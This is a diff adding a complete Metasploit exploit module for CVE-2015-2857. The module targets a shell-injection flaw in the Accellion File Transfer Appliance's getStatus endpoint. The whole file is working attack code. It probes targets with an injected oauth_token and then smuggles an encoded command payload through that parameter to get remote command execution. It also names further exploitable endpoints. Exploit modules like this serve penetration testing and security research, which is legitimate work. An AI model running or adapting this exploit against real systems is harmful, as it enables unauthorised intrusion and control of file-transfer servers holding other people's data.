@@ -1,0 +1,125 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Accellion FTA getStatus verify_oauth_token Command Execution',
+      'Description'    => %q{
+          This module exploits a metacharacter shell injection vulnerability in the Accellion
+        File Transfer appliance. This vulnerability is triggered when a user-provided
+        'oauth_token' is passed into a system() call within a mod_perl handler. This
+        module exploits the '/tws/getStatus' endpoint. Other vulnerable handlers include
+        '/seos/find.api', '/seos/put.api', and /seos/mput.api'. This issue was confirmed on
+        version FTA_9_11_200, but may apply to previous versions as well. This issue was
+        fixed in software update FTA_9_11_210.
+      },
+      'Author'         => [ 'hdm' ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['URL', 'http://r-7.co/R7-2015-08'],
+          ['CVE', '2015-2857']
+        ],
+      'Platform'       => ['unix'],
+      'Arch'           => ARCH_CMD,
+      'Privileged'     => false,
+      'Payload'        =>
+        {
+          'Space'       => 1024,
+          'DisableNops' => true,
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic perl bash telnet',
+            }
+        },
+      'Targets'        =>
+        [
+          [ 'Automatic', { } ]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Jul 10 2015'
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(443),
+        OptBool.new('SSL', [true, 'Use SSL', true])
+      ], self.class)
+  end
+
+  def check
+    uri = '/tws/getStatus'
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => uri,
+      'vars_post' => {
+        'transaction_id' => rand(0x100000000),
+        'oauth_token'    => 'invalid'
+    }})
+
+    unless res && res.code == 200 && res.body.to_s =~ /"result_msg":"MD5 token is invalid"/
+      return Exploit::CheckCode::Safe
+    end
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => uri,
+      'vars_post' => {
+        'transaction_id' => rand(0x100000000),
+        'oauth_token'    => "';echo '"
+    }})
+
+    unless res && res.code == 200 && res.body.to_s =~ /"result_msg":"Success","transaction_id":"/
+      return Exploit::CheckCode::Safe
+    end
+
+    Msf::Exploit::CheckCode::Vulnerable
+  end
+
+  def exploit
+
+    # The token is embedded into a command line the following:
+    # `/opt/bin/perl /home/seos/system/call_webservice.pl $aid oauth_ws.php verify_access_token '$token' '$scope'`;
+    token = "';#{payload.encoded};echo '"
+
+    uri   = '/tws/getStatus'
+
+    # Other exploitable URLs:
+    # * /seos/find.api (works with no other changes to this module)
+    # * /seos/put.api  (requires some hoop jumping, upload)
+    # * /seos/mput.api (requires some hoop jumping, token && upload)
+
+    print_status("Sending request for #{uri}...")
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => uri,
+      'vars_post' => {
+        'transaction_id' => rand(0x100000000),
+        'oauth_token'    => token
+    }})
+
+    if res && res.code == 200 && res.body.to_s =~ /"result_msg":"Success","transaction_id":"/
+      print_status("Valid response received...")
+    else
+      if res
+        print_error("Unexpected reply from the target: #{res.code} #{res.message} #{res.body}")
+      else
+        print_error("No reply received from the target")
+      end
+    end
+
+    handler
+  end
+
+end
